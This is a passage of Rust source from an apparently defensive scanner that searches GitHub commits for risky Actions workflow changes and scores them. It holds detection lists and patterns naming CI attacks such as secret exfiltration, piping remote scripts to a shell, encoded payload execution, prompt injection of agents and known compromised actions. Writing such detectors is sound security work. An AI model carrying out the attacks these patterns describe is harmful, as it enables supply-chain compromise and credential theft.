    "runner_local_artifact_publish_with_boundary_change",
    "external_artifact_publish_with_boundary_change",
    "publishes_committed_archive_artifact",
    "local_archive_publish_with_release_gate_rewrite",
    "registry_publish_with_committed_archive",
    "pull_request_target_untrusted_checkout_with_write_capability",
    "pull_request_target_with_oidc_write",
    "pull_request_target_with_explicit_secret_use",
    "privileged_checkout_persists_credentials",
    "workflow_run_artifact_with_write_or_publish_capability",
    "workflow_run_untrusted_checkout_with_write_or_publish",
    "workflow_modifies_branch_protection_with_write_capability",
    "dispatch_backdoor_with_write_or_publish_capability",
    "dispatch_backdoor_with_repo_token",
    "unpinned_reusable_workflow_with_secret_inheritance",
    "untrusted_code_on_self_hosted_runner",
    "self_hosted_runner_with_repo_token_and_untrusted_input",
    "protective_workflow_bypass_with_sensitive_follow_on_change",
    "agentic_prompt_injection_with_write_or_secret_capability",
    "agentic_prompt_injection_on_self_hosted_runner",
    "agentic_prompt_injection_over_fork_pr_material",
    "staged_local_artifact_publish_with_registry_capability",
    "direct_script_injection_in_privileged_workflow",
    "workflow_secret_enumeration_and_external_exfiltration",
    "explicit_secret_exfiltration_to_external_endpoint",
    "sensitive_files_uploaded_as_artifact",
    "sensitive_paths_cached_in_workflow",
    "git_credential_persistence_with_repo_token",
    "remote_script_pipe_to_shell",
    "base64_decoded_payload_execution",
    "powershell_encoded_command_execution",
    "untrusted_input_written_to_github_env",
    "github_script_executes_untrusted_dynamic_code",
    "package_script_safety_guard_removed",
    "privileged_shell_uses_untrusted_ref_name",
    "docker_socket_exposed_to_untrusted_workflow",
    "cloud_secret_with_external_network_path",
    "ghostaction_style_secret_exfiltration_workflow",
    "runner_memory_secret_harvesting_with_external_exfiltration",
    "unpinned_third_party_action_in_privileged_workflow",
    "known_compromised_mutable_action_ref",
    "known_compromised_action_in_privileged_workflow",
    "action_dependency_ref_downgrade_to_mutable",
    "pull_request_target_executes_untrusted_code",
    "action_manifest_remote_script_execution",
    "security_workflow_removed_with_action_manifest_change",
    "agent_instruction_file_with_action_manifest_change",
    "pull_request_target_cache_poisoning_surface",
    "removes_pull_request_target_cache_poisoning_surface",
    "agent_or_editor_startup_hook_executes_repo_code",
    "agent_runtime_bootstrap_executes_local_payload",
    "agent_autorun_bootstrap_chain",
    "removed_oidc_registry_token_exposure_forensics",
];

const KNOWN_COMPROMISED_ACTIONS: &[(&str, &str)] = &[
    (
        "tj-actions/changed-files",
        "Publicly reported March 2025 GitHub Actions supply-chain compromise",
    ),
    (
        "reviewdog/action-setup",
        "Publicly reported March 2025 GitHub Actions compromise linked to tj-actions incident",
    ),
    (
        "aquasecurity/trivy-action",
        "Publicly reported March 2026 Trivy GitHub Actions tag hijack",
    ),
    (
        "aquasecurity/setup-trivy",
        "Publicly reported March 2026 Trivy GitHub Actions tag hijack",
    ),
];

#[derive(Clone)]
enum CommitSeed {
    Summary(Value),
    Sha(String),
}

impl CommitSeed {
    fn sha(&self) -> Option<&str> {
        match self {
            Self::Summary(value) => value.get("sha").and_then(Value::as_str),
            Self::Sha(sha) => Some(sha.as_str()),
        }
    }
}

#[derive(Debug, Clone, Serialize)]
struct Finding {
    repo: String,
    sha: String,
    url: String,
    date: String,
    author: String,
    message: String,
    score: i32,
    factors: Vec<String>,
    workflow_files: Vec<String>,
    archive_files: Vec<String>,
    actions_runs: Vec<String>,
    pull_requests: Vec<String>,
    evidence_added: Vec<String>,
    evidence_removed: Vec<String>,
    archive_blobs: Vec<String>,
    npm_oidc_packages: Vec<String>,
    message_evidence: Vec<String>,
    #[serde(skip_serializing)]
    factor_hits: Vec<FactorHit>,
}

impl Finding {
    fn severity(&self) -> &'static str {
        if self.score >= 10 {
            "critical"
        } else if self.score >= 7 {
            "high"
        } else if self.score >= 4 {
            "suspicious"
        } else {
            "low"
        }
    }
}

#[derive(Debug, Clone)]
struct FactorHit {
    factor: String,
    score: i32,
}

pub(crate) fn run_hunt(args: GithubWorkflowHuntArgs) -> Result<i32> {
    let mut findings = Vec::new();
    let mut repo_commits: BTreeMap<String, Vec<CommitSeed>> = args
        .repos
        .iter()
        .cloned()
        .map(|repo| (repo, Vec::new()))
        .collect();
    let mut seen_seed_paths: HashSet<(String, String)> = HashSet::new();

    let mut seed_queries = Vec::new();
    for preset in &args.hunt_presets {
        seed_queries.extend(preset.queries().iter().map(|query| (*query).to_string()));
    }
    seed_queries.extend(args.seed_code_search.iter().cloned());

    for query in seed_queries {
        if args.verbose {
            eprintln!("seed query: {query}");
        }
        for hit in gh_search_code(&query, args.search_limit.unwrap_or(args.limit))? {
            let repo = hit
                .get("repository")
                .and_then(|value| value.get("nameWithOwner"))
                .and_then(Value::as_str);
            let path_filter = hit.get("path").and_then(Value::as_str);
            let (Some(repo), Some(path_filter)) = (repo, path_filter) else {
                continue;
            };
            let seed_key = (repo.to_string(), path_filter.to_string());
            if !seen_seed_paths.insert(seed_key) {
                continue;
            }
            repo_commits.entry(repo.to_string()).or_default().extend(
                list_commits_for_path(
                    repo,
                    path_filter,
                    args.since.as_deref(),
                    args.until.as_deref(),
                    args.commits_per_path.max(1),
                )?
                .into_iter()
                .map(CommitSeed::Summary),
            );
        }
        if args.seed_delay_ms > 0 {
            thread::sleep(Duration::from_millis(args.seed_delay_ms));
        }
    }

    let mut commit_seed_queries = Vec::new();
    for preset in &args.message_hunt_presets {
        commit_seed_queries.extend(preset.queries().iter().map(|query| (*query).to_string()));
    }
    commit_seed_queries.extend(args.seed_commit_search.iter().cloned());

    for query in commit_seed_queries {
        let query_with_date = if let Some(since) = args.since.as_deref() {
            if query.contains("author-date:") {
                query
            } else {
                let date = since.get(..10).unwrap_or(since);
                format!("{query} author-date:>{date}")
            }
        } else {
            query
        };
        if args.verbose {
            eprintln!("commit seed query: {query_with_date}");
        }
        for hit in gh_search_commits(&query_with_date, args.search_limit.unwrap_or(args.limit))? {
            let repo = hit
                .get("repository")
                .and_then(|value| value.get("fullName").or_else(|| value.get("nameWithOwner")))
                .and_then(Value::as_str);
            let sha = hit.get("sha").and_then(Value::as_str);
            let (Some(repo), Some(sha)) = (repo, sha) else {
                continue;
            };
            repo_commits
                .entry(repo.to_string())
                .or_default()
                .push(CommitSeed::Sha(sha.to_string()));
        }
        if args.seed_delay_ms > 0 {
            thread::sleep(Duration::from_millis(args.seed_delay_ms));
        }
    }

    for item in &args.seed_path {
        let Some((repo, path_filter)) = item.split_once(':') else {
            eprintln!("ERROR invalid --seed-path {item:?}; expected OWNER/REPO:path");
            continue;
        };
        if repo.is_empty() || path_filter.is_empty() {
            eprintln!("ERROR invalid --seed-path {item:?}; expected OWNER/REPO:path");
            continue;
        }
        repo_commits.entry(repo.to_string()).or_default().extend(
            list_commits_for_path(
                repo,
                path_filter,
                args.since.as_deref(),
                args.until.as_deref(),
                args.commits_per_path.max(1),
            )?
            .into_iter()
            .map(CommitSeed::Summary),
        );
    }

    for repo in &args.repos {
        repo_commits.entry(repo.clone()).or_default();
    }

    for (repo, seeded_commits) in repo_commits {
        let repo_result: Result<()> = (|| {
            let commits = if !args.sha.is_empty() {
                args.sha
                    .iter()
                    .cloned()
                    .map(CommitSeed::Sha)
                    .collect::<Vec<_>>()
            } else if !seeded_commits.is_empty() {
                dedupe_commits(seeded_commits)
            } else {
                list_commits(
                    &repo,
                    args.since.as_deref(),
                    args.until.as_deref(),
                    args.limit,
                )?
                .into_iter()
                .map(CommitSeed::Summary)
                .collect::<Vec<_>>()
            };

            for commit in commits {
                if args.verbose {
                    let commit_sha = commit.sha().unwrap_or("");
                    eprintln!("inspect {}@{}", repo, prefix_sha(commit_sha));
                }
                if let Some(finding) = analyze_commit(
                    &repo,
                    &commit,
                    args.enrich,
                    args.show_evidence,
                    args.include_weak_workflow_signals,
                )? {
                    if finding.score >= args.min_score as i32 {
                        findings.push(finding);
                    }
                }
            }
            Ok(())
        })();
        if let Err(error) = repo_result {
            eprintln!("ERROR {repo}: {error}");
        }
    }

    findings.sort_by(|left, right| {
        right
            .score
            .cmp(&left.score)
            .then_with(|| right.date.cmp(&left.date))
    });

    for finding in &findings {
        if args.json {
            println!("{}", serde_json::to_string(finding)?);
        } else {
            print_finding(finding, args.explain);
        }
    }

    Ok(if findings.iter().any(|finding| finding.score >= 10) {
        1
    } else {
        0
    })
}

fn dedupe_commits(commits: Vec<CommitSeed>) -> Vec<CommitSeed> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for commit in commits {
        if let Some(sha) = commit.sha() {
            if seen.insert(sha.to_string()) {
                out.push(commit);
            }
        }
    }
    out
}

fn gh_json(path: &str, paginate: bool) -> Result<Value> {
    let mut last_error = String::new();
    for attempt in 0..3 {
        match github_get(path, paginate) {
            Ok(value) => return Ok(value),
            Err(error) => {
                let message = error.to_string();
                if message.contains("rate limit")
                    || message.contains("secondary rate")
                    || message.contains("timed out")
                    || message.contains("connection")
                {
                    thread::sleep(Duration::from_secs(2 + (attempt * 3) as u64));
                    last_error = message;
                    continue;
                }
                return Err(error);
            }
        }
    }
    bail!("GitHub API request {path} failed after retries: {last_error}");
}

fn github_url(path: &str) -> String {
    if path.starts_with("http://") || path.starts_with("https://") {
        path.to_string()
    } else {
        format!("https://api.github.com/{}", path.trim_start_matches('/'))
    }
}

fn github_get(path: &str, paginate: bool) -> Result<Value> {
    if !paginate {
        return github_response_json(GITHUB_CLIENT.get(github_url(path)).send(), path);
    }

    let mut values = Vec::new();
    let mut next_url = Some(github_url(path));
    while let Some(url) = next_url {
        let response = GITHUB_CLIENT
            .get(&url)
            .send()
            .with_context(|| format!("GitHub API request failed: {url}"))?;
        next_url = next_link(response.headers());
        let status = response.status();
        let text = response
            .text()
            .with_context(|| format!("GitHub API response read failed: {url}"))?;
        if !status.is_success() {
            bail!("GitHub API {url} failed ({status}): {text}");
        }
        if text.trim().is_empty() {
            continue;
        }
        match serde_json::from_str::<Value>(&text)
            .with_context(|| format!("GitHub API {url} returned invalid JSON"))?
        {
            Value::Array(items) => values.extend(items),
            value => return Ok(value),
        }
    }
    Ok(Value::Array(values))
}

fn github_response_json(response: reqwest::Result<Response>, path: &str) -> Result<Value> {
    let response =
        response.with_context(|| format!("GitHub API request failed: {}", github_url(path)))?;
    let status = response.status();
    let text = response
        .text()
        .with_context(|| format!("GitHub API response read failed: {}", github_url(path)))?;
    if !status.is_success() {
        bail!("GitHub API {} failed ({status}): {text}", github_url(path));
    }
    if text.trim().is_empty() {
        return Ok(Value::Null);
    }
    serde_json::from_str(&text)
        .with_context(|| format!("GitHub API {} returned invalid JSON", github_url(path)))
}

fn next_link(headers: &HeaderMap) -> Option<String> {
    let link = headers.get("link")?.to_str().ok()?;
    for part in link.split(',') {
        let mut sections = part.trim().split(';');
        let url = sections.next()?.trim();
        let rel = sections.any(|section| section.trim() == r#"rel="next""#);
        if rel {
            return url
                .strip_prefix('<')
                .and_then(|value| value.strip_suffix('>'))
                .map(str::to_string);
        }
    }
    None
}

fn gh_search_code(query: &str, limit: usize) -> Result<Vec<Value>> {
    let per_page = limit.clamp(1, 100);
    let path = format!(
        "search/code?q={}&per_page={per_page}",
        urlencoding::encode(query)
    );
    let value = gh_json(&path, false)?;
    Ok(value
        .get("items")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .take(limit)
        .map(|item| {
            let full_name = item
                .get("repository")
                .and_then(|repo| repo.get("full_name"))
                .and_then(Value::as_str)
                .unwrap_or("");
            json!({
                "repository": {
                    "nameWithOwner": full_name,
                    "fullName": full_name,
                },
                "path": item.get("path").and_then(Value::as_str).unwrap_or(""),
                "url": item.get("html_url").and_then(Value::as_str).unwrap_or(""),
            })
        })
        .collect())
}

fn gh_search_commits(query: &str, limit: usize) -> Result<Vec<Value>> {
    let per_page = limit.clamp(1, 100);
    let path = format!(
        "search/commits?q={}&per_page={per_page}",
        urlencoding::encode(query)
    );
    let value = gh_json(&path, false)?;
    Ok(value
        .get("items")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .take(limit)
        .map(|item| {
            let full_name = item
                .get("repository")
                .and_then(|repo| repo.get("full_name"))
                .and_then(Value::as_str)
                .unwrap_or("");
            json!({
                "repository": {
                    "nameWithOwner": full_name,
                    "fullName": full_name,
                },
                "sha": item.get("sha").and_then(Value::as_str).unwrap_or(""),
                "url": item.get("html_url").and_then(Value::as_str).unwrap_or(""),
                "commit": item.get("commit").cloned().unwrap_or(Value::Null),
            })
        })
        .collect())
}

fn list_commits(
    repo: &str,
    since: Option<&str>,
    until: Option<&str>,
    limit: usize,
) -> Result<Vec<Value>> {
    let per_page = limit.clamp(1, 100);
    let mut params = vec![format!("per_page={per_page}")];
    if let Some(since) = since {
        params.push(format!("since={since}"));
    }
    if let Some(until) = until {
        params.push(format!("until={until}"));
    }
    let path = format!("repos/{repo}/commits?{}", params.join("&"));
    match gh_json(&path, false)? {
        Value::Array(values) => Ok(values.into_iter().take(limit).collect()),
        _ => Ok(Vec::new()),
    }
}

fn list_commits_for_path(
    repo: &str,
    path_filter: &str,
    since: Option<&str>,
    until: Option<&str>,
    limit: usize,
) -> Result<Vec<Value>> {
    let per_page = limit.clamp(1, 100);
    let mut params = vec![
        format!("per_page={per_page}"),
        format!("path={path_filter}"),
    ];
    if let Some(since) = since {
        params.push(format!("since={since}"));
    }
    if let Some(until) = until {
        params.push(format!("until={until}"));
    }
    let path = format!("repos/{repo}/commits?{}", params.join("&"));
    match gh_json(&path, false)? {
        Value::Array(values) => Ok(values.into_iter().take(limit).collect()),
        _ => Ok(Vec::new()),
    }
}

fn decode_content(repo: &str, path: &str, reference: &str) -> String {
    let Ok(value) = gh_json(
        &format!("repos/{repo}/contents/{path}?ref={reference}"),
        false,
    ) else {
        return String::new();
    };
    let encoded = value
        .get("content")
        .and_then(Value::as_str)
        .unwrap_or("")
        .split_whitespace()
        .collect::<String>();
    if encoded.is_empty() {
        return String::new();
    }
    STANDARD
        .decode(encoded.as_bytes())
        .ok()
        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
        .unwrap_or_default()
}

fn fetch_runs(repo: &str, sha: &str) -> Vec<String> {
    let Ok(runs) = gh_json(
        &format!("repos/{repo}/actions/runs?head_sha={sha}&per_page=20"),
        false,
    ) else {
        return Vec::new();
    };
    runs.get("workflow_runs")
        .and_then(Value::as_array)
        .map(|runs| {
            runs.iter()
                .filter_map(|run| {
                    let url = run.get("html_url").and_then(Value::as_str)?;
                    let name = run
                        .get("name")
                        .and_then(Value::as_str)
                        .or_else(|| run.get("display_title").and_then(Value::as_str))
                        .unwrap_or("workflow");
                    let event = run.get("event").and_then(Value::as_str).unwrap_or("event?");
                    let conclusion = run
                        .get("conclusion")
                        .and_then(Value::as_str)
                        .or_else(|| run.get("status").and_then(Value::as_str))
                        .unwrap_or("unknown");
                    Some(format!("{name} [{event}/{conclusion}] {url}"))
                })
                .collect()
        })
        .unwrap_or_default()
}

fn fetch_prs(repo: &str, sha: &str) -> Vec<String> {
    let Ok(prs) = gh_json(&format!("repos/{repo}/commits/{sha}/pulls"), false) else {
        return Vec::new();
    };
    prs.as_array()
        .map(|prs| {
            prs.iter()
                .filter_map(|pr| {
                    let url = pr.get("html_url").and_then(Value::as_str)?;
                    let number = pr.get("number").and_then(Value::as_i64).unwrap_or(0);
                    let state = pr.get("state").and_then(Value::as_str).unwrap_or("");
                    Some(format!("PR #{number} [{state}] {url}"))
                })
                .collect()
        })
        .unwrap_or_default()
}

fn patch_for_file(file: &Value, repo: &str, sha: &str, parent_sha: Option<&str>) -> String {
    let patch = file
        .get("patch")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string();
    if !patch.is_empty() || parent_sha.is_none() {
        return patch;
    }
    let filename = file.get("filename").and_then(Value::as_str).unwrap_or("");
    if !WORKFLOW_RE.is_match(filename) {
        return patch;
    }
    let before = decode_content(repo, filename, parent_sha.unwrap_or_default());
    let after = decode_content(repo, filename, sha);
    if before.is_empty() && after.is_empty() {
        return patch;
    }
    let before_lines = before.lines().collect::<Vec<_>>();
    let after_lines = after.lines().collect::<Vec<_>>();
    let after_set = after_lines.iter().copied().collect::<HashSet<_>>();
    let before_set = before_lines.iter().copied().collect::<HashSet<_>>();
    let removed = before_lines
        .iter()
        .filter(|line| !after_set.contains(**line))
        .map(|line| format!("-{line}"))
        .collect::<Vec<_>>()
        .join("\n");
    let added = after_lines
        .iter()
        .filter(|line| !before_set.contains(**line))
        .map(|line| format!("+{line}"))
        .collect::<Vec<_>>()
        .join("\n");
    format!("{removed}\n{added}")
}

fn add_factor(finding: &mut Finding, score: i32, factor: &str) {
    finding.score += score;
    finding.factor_hits.push(FactorHit {
        factor: factor.to_string(),
        score,
    });
    if !finding.factors.iter().any(|existing| existing == factor) {
        finding.factors.push(factor.to_string());
    }
}

fn redact_secret(value: &str) -> String {
    if value.starts_with("ghp_") && value.len() > 12 {
        format!("{}...{}", &value[..8], &value[value.len() - 4..])
    } else if value.starts_with("github_pat_") && value.len() > 20 {
        format!("{}...{}", &value[..14], &value[value.len() - 4..])
    } else {
        "<redacted>".to_string()
    }
}

fn redact_message(value: &str) -> String {
    let redacted_tokens = GITHUB_TOKEN_RE.replace_all(value, |captures: &Captures<'_>| {
        redact_secret(captures.get(0).map(|m| m.as_str()).unwrap_or_default())
    });
    TEAMPCP_MARKER_RE
        .replace_all(
            &redacted_tokens,
            "LongLiveTheResistanceAgainstMachines:<encoded-payload-redacted>",
        )
        .into_owned()
}

fn decode_possible_base64(value: &str, rounds: usize) -> Vec<String> {
    let mut decoded = Vec::new();
    let mut current = value.to_string();
    for _ in 0..rounds {
        let padding = (4 - current.len() % 4) % 4;
        let padded = format!("{current}{}", "=".repeat(padding));
        let Ok(raw) = STANDARD.decode(padded.as_bytes()) else {
            break;
        };
        let text = String::from_utf8_lossy(&raw).trim().to_string();
        if text.is_empty() || text == current {
            break;
        }
        decoded.push(text.clone());
        current = text;
    }
    decoded
}

fn message_secret_evidence(message: &str) -> (i32, Vec<String>, Vec<String>) {
    let mut score = 0;
    let mut factors = Vec::new();
    let mut evidence = Vec::new();

    let direct_tokens = GITHUB_TOKEN_RE
        .find_iter(message)
        .map(|mat| mat.as_str().to_string())
        .collect::<Vec<_>>();
    if !direct_tokens.is_empty() {
        score += 10;
        factors.push("commit_message_contains_github_token".to_string());
        let redacted = direct_tokens
            .iter()
            .take(5)
            .map(|token| redact_secret(token))
            .collect::<Vec<_>>()
            .join(", ");
        evidence.push(format!(
            "direct GitHub token-like value in commit message: {redacted}"
        ));
    }

    for marker in TEAMPCP_MARKER_RE.captures_iter(message) {
        let encoded = marker.get(1).map(|mat| mat.as_str()).unwrap_or_default();
        let decoded_values = decode_possible_base64(encoded, 3);
        let mut decoded_tokens = Vec::new();
        for decoded in decoded_values {
            decoded_tokens.extend(
                GITHUB_TOKEN_RE
                    .find_iter(&decoded)
                    .map(|mat| mat.as_str().to_string()),
            );
        }
        if !decoded_tokens.is_empty() {
            score += 12;
            factors.push("prompt_injection_marker_decodes_to_github_token".to_string());
            let redacted = decoded_tokens
                .iter()
                .take(5)
                .map(|token| redact_secret(token))
                .collect::<Vec<_>>()
                .join(", ");
            evidence.push(format!(
                "TeamPCP-style marker decodes to GitHub token-like value: {redacted}"
            ));
        } else {
            score += 6;
            factors.push("prompt_injection_marker_in_commit_message".to_string());
            evidence.push("TeamPCP-style marker found in commit message".to_string());
        }
    }

    (score, factors, evidence)
}

fn extract_evidence_lines(text: &str, prefix: &str, limit: usize) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for line in text.lines() {
        if !EVIDENCE_LINE_RE.is_match(line) {
            continue;
        }
        let mut cleaned = line.trim().to_string();
        if cleaned.is_empty() {
            continue;
        }
        if let Some(stripped) = cleaned.strip_prefix(prefix) {
            cleaned = stripped.trim().to_string();
        }
        if seen.insert(cleaned.clone()) {
            out.push(truncate_line(&cleaned, 260));
            if out.len() >= limit {
                break;
            }
        }
    }
    out
}

fn extract_npm_oidc_packages(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for captures in NPM_OIDC_PACKAGE_RE.captures_iter(text) {
        let raw = captures.get(1).map(|mat| mat.as_str()).unwrap_or_default();
        let trimmed = raw.trim_end_matches(|ch| ch == '\\' || ch == ')');
        let package = urlencoding::decode(trimmed)
            .map(|cow| cow.into_owned())
            .unwrap_or_else(|_| trimmed.to_string());
        if !package.is_empty() && seen.insert(package.clone()) {
            out.push(package);
        }
    }
    out
}

fn archive_blob_evidence(files: &[Value]) -> Vec<String> {
    let mut out = Vec::new();
    for file in files {
        let filename = file.get("filename").and_then(Value::as_str).unwrap_or("");
        if !ARCHIVE_RE.is_match(filename) {
            continue;
        }
        let status = file
            .get("status")
            .and_then(Value::as_str)
            .unwrap_or("unknown");
        let sha = file.get("sha").and_then(Value::as_str).unwrap_or("sha?");
        let additions = file.get("additions").and_then(Value::as_i64);
        let deletions = file.get("deletions").and_then(Value::as_i64);
        let change = if additions.is_some() || deletions.is_some() {
            format!(" +{}/-{}", additions.unwrap_or(0), deletions.unwrap_or(0))
        } else {
            String::new()
        };
        out.push(format!("{status} {filename} blob={sha}{change}"));
    }
    out
}

fn token_exposure_lines(text: &str) -> Vec<String> {
    token_exposure_lines_with_prefix(text, '+')
}

fn removed_token_exposure_lines(text: &str) -> Vec<String> {
    token_exposure_lines_with_prefix(text, '-')
}

fn token_exposure_lines_with_prefix(text: &str, prefix: char) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for raw_line in text.lines() {
        let line = raw_line.trim();
        if !line.starts_with(prefix) || !TOKEN_EXPOSURE_RE.is_match(line) {
            continue;
        }
        let matched = TOKEN_ECHO_RE.is_match(line)
            || TOKEN_PRINTENV_RE.is_match(line)
            || TOKEN_PIPE_BASE64_RE.is_match(line)
            || TOKEN_BASE64_RE.is_match(line);
        if !matched {
            continue;
        }
        let cleaned = line
            .strip_prefix(prefix)
            .map(str::trim)
            .unwrap_or(line)
            .to_string();
        if seen.insert(cleaned.clone()) {
            out.push(truncate_line(&cleaned, 260));
        }
    }
    out
}

fn is_generated_workflow_regen(
    workflow_files: &[Value],
    message: &str,
    added_lines: &str,
    removed_lines: &str,
) -> bool {
    let generated_count = workflow_files
        .iter()
        .filter(|workflow_file| {
            workflow_file
                .get("filename")
                .and_then(Value::as_str)
                .map(|filename| GENERATED_WORKFLOW_RE.is_match(filename))
                .unwrap_or(false)
        })
        .count();
    if generated_count < 2 {
        return false;
    }
    if added_lines.contains("# GENERATED BY") {
        return true;
    }
    let lower_message = message.to_lowercase();
    if lower_message.contains("generated") || lower_message.contains("gagen") {
        return true;
    }
    removed_lines.contains("# GENERATED BY")
}

fn is_generated_dependency_pin_regen(generated_workflow_regen: bool, message: &str) -> bool {
    if !generated_workflow_regen {
        return false;
    }
    let lower_message = message.to_lowercase();
    lower_message.contains("gagen")
        && (lower_message.contains("pinning") || lower_message.contains("workflow dependencies"))
}

fn is_locked_workflow_bundle(
    workflow_files: &[Value],
    added_lines: &str,
    removed_lines: &str,
) -> bool {
    let locked_count = workflow_files
        .iter()
        .filter(|workflow_file| {
            workflow_file
                .get("filename")
                .and_then(Value::as_str)
                .map(|filename| LOCKED_WORKFLOW_RE.is_match(filename))
                .unwrap_or(false)
        })
        .count();
    if locked_count < 2 {
        return false;
    }
    added_lines.contains("gh-aw-manifest")
        || added_lines.contains("gh-aw-metadata")
        || removed_lines.contains("gh-aw-manifest")
        || removed_lines.contains("gh-aw-metadata")
}

fn has_protective_workflow_context(workflow_files: &[Value]) -> bool {
    workflow_files.iter().any(|workflow_file| {
        workflow_file
            .get("filename")
            .and_then(Value::as_str)
            .map(|filename| PROTECTIVE_WORKFLOW_FILE_RE.is_match(filename))
            .unwrap_or(false)
    })
}

fn is_sensitive_automation_file(filename: &str) -> bool {
    WORKFLOW_RE.is_match(filename)
        || ACTION_MANIFEST_RE.is_match(filename)
        || AGENT_INSTRUCTION_FILE_RE.is_match(filename)
        || AGENT_EDITOR_AUTORUN_FILE_RE.is_match(filename)
}

fn has_action_manifest_file(files: &[Value]) -> bool {
    files.iter().any(|file| {
        file.get("filename")
            .and_then(Value::as_str)
            .is_some_and(|filename| ACTION_MANIFEST_RE.is_match(filename))
    })
}

fn has_dependency_manifest_file(files: &[Value]) -> bool {
    files.iter().any(|file| {
        file.get("filename")
            .and_then(Value::as_str)
            .is_some_and(|filename| DEPENDENCY_MANIFEST_RE.is_match(filename))
    })
}

fn has_added_agent_instruction_file(files: &[Value]) -> bool {
    files.iter().any(|file| {
        let filename_matches = file
            .get("filename")
            .and_then(Value::as_str)
            .is_some_and(|filename| AGENT_INSTRUCTION_FILE_RE.is_match(filename));
        let added = file
            .get("status")
            .and_then(Value::as_str)
            .is_some_and(|status| status == "added");
        filename_matches && added
    })
}

fn has_added_agent_editor_autorun_file(files: &[Value]) -> bool {
    files.iter().any(|file| {
        let filename_matches = file
            .get("filename")
            .and_then(Value::as_str)
            .is_some_and(|filename| AGENT_EDITOR_AUTORUN_FILE_RE.is_match(filename));
        let added = file
            .get("status")
            .and_then(Value::as_str)
            .is_some_and(|status| status == "added");
        filename_matches && added
    })
}

fn has_added_agent_payload_script(files: &[Value]) -> bool {
    files.iter().any(|file| {
        let filename_matches =
            file.get("filename")
                .and_then(Value::as_str)
                .is_some_and(|filename| {
                    filename.eq_ignore_ascii_case(".claude/execution.js")
                        || filename.eq_ignore_ascii_case("execution.js")
                });
        let added_or_modified = file
            .get("status")
            .and_then(Value::as_str)
            .is_some_and(|status| status == "added" || status == "modified");
        filename_matches && added_or_modified
    })
}

fn has_removed_protective_workflow(files: &[Value], removed_lines: &str) -> bool {
    let removed_protective_file = files.iter().any(|file| {
        let filename_matches =
            file.get("filename")
                .and_then(Value::as_str)
                .is_some_and(|filename| {
                    WORKFLOW_RE.is_match(filename) && PROTECTIVE_WORKFLOW_FILE_RE.is_match(filename)
                });
        let status_removed = file
            .get("status")
            .and_then(Value::as_str)
            .is_some_and(|status| status == "removed");
        let only_deletions = file
            .get("additions")
            .and_then(Value::as_i64)
            .unwrap_or_default()
            == 0
            && file
                .get("deletions")
                .and_then(Value::as_i64)
                .unwrap_or_default()
                > 0;
        filename_matches && (status_removed || only_deletions)
    });
    removed_protective_file && REMOVED_GATES_RE.is_match(removed_lines)
}

fn has_suspicious_workflow_file(files: &[Value]) -> bool {
    files.iter().any(|file| {
        file.get("filename")
            .and_then(Value::as_str)
            .is_some_and(|filename| SUSPICIOUS_WORKFLOW_FILE_RE.is_match(filename))
    })
}

fn explicit_secret_reference_count(text: &str) -> usize {
    EXPLICIT_SECRET_REFERENCE_RE
        .find_iter(text)
        .map(|mat| mat.as_str().to_ascii_uppercase())
        .collect::<HashSet<_>>()
        .len()
}

fn has_external_non_github_network_call(text: &str) -> bool {
    text.lines().any(|line| {
        let lowered = line.to_ascii_lowercase();
        if !(lowered.contains("curl")
            || lowered.contains("wget")
            || lowered.contains("invoke-webrequest")
            || lowered.contains("invoke-restmethod")
            || lowered.contains("nc ")
            || lowered.contains("ncat ")
            || lowered.contains("scp ")
            || lowered.contains("sftp "))
        {
            return false;
        }
        URL_RE.find_iter(line).any(|url_match| {
            let url = url_match.as_str().to_ascii_lowercase();
            !(url.contains("github.com/")
                || url.contains("api.github.com/")
                || url.contains("githubusercontent.com/")
                || url.contains("registry.npmjs.org/")
                || url.contains("pypi.org/")
                || url.contains("crates.io/")
                || url.contains("rubygems.org/")
                || url.contains("nuget.org/"))
        })
    })
}

fn has_secret_enumeration_exfil_path(text: &str) -> bool {
    SECRET_ENUMERATION_EXFIL_RE.is_match(text)
}

fn has_untrusted_artifact_fetch(added_lines: &str) -> bool {
    for line in added_lines.lines() {
        let lowered = line.to_lowercase();
        if lowered.contains("oidc/token") || lowered.contains("registry.npmjs.org") {
            continue;
        }
        if UNTRUSTED_ARTIFACT_FETCH_RE.is_match(line) {
            return true;
        }
    }
    false
}

fn has_external_artifact_fetch(added_lines: &str) -> bool {
    for line in added_lines.lines() {
        let lowered = line.to_lowercase();
        if lowered.contains("oidc/token") || lowered.contains("registry.npmjs.org") {
            continue;
        }
        if !lowered.contains("curl") && !lowered.contains("wget") {
            continue;
        }
        if lowered.contains("github.com/") || lowered.contains("api.github.com/") {
            continue;
        }
        if line.contains("http://") || line.contains("https://") {
            let has_artifact =
                Regex::new(r"(?i)\.(tgz|tar\.gz|whl|crate|nupkg|gem)\b|artifact|tarball|package")
                    .expect("artifact regex")
                    .is_match(line);
            if has_artifact {
                return true;
            }
        }
    }
    false
}

fn action_ref_type_factor(reusable_workflow: bool, ref_type: &ActionRefType) -> &'static str {
    match (reusable_workflow, ref_type) {
        (true, ActionRefType::FullSha) => "uses_sha_pinned_reusable_workflow_ref",
        (true, ActionRefType::Tag) => "uses_mutable_tag_reusable_workflow_ref",
        (true, ActionRefType::Branch) => "uses_branch_reusable_workflow_ref",
        (true, ActionRefType::ClearlyMutable) => "uses_clearly_mutable_reusable_workflow_ref",
        (false, ActionRefType::FullSha) => "uses_sha_pinned_action_ref",
        (false, ActionRefType::Tag) => "uses_mutable_tag_action_ref",
        (false, ActionRefType::Branch) => "uses_branch_action_ref",
        (false, ActionRefType::ClearlyMutable) => "uses_clearly_mutable_action_ref",
    }
}

fn resolved_action_ref_type(
    action_use: &ActionUse,
    cache: &mut HashMap<String, ActionRefType>,
) -> ActionRefType {
    if action_use.ref_type != ActionRefType::ClearlyMutable {
        return action_use.ref_type.clone();
    }

    let normalized_repo = format!("{}/{}", action_use.owner, action_use.repo).to_ascii_lowercase();
    let cache_key = format!("{normalized_repo}@{}", action_use.reference);
    if let Some(cached) = cache.get(&cache_key) {
        return cached.clone();
    }

    let reference = action_use
        .reference
        .strip_prefix("refs/heads/")
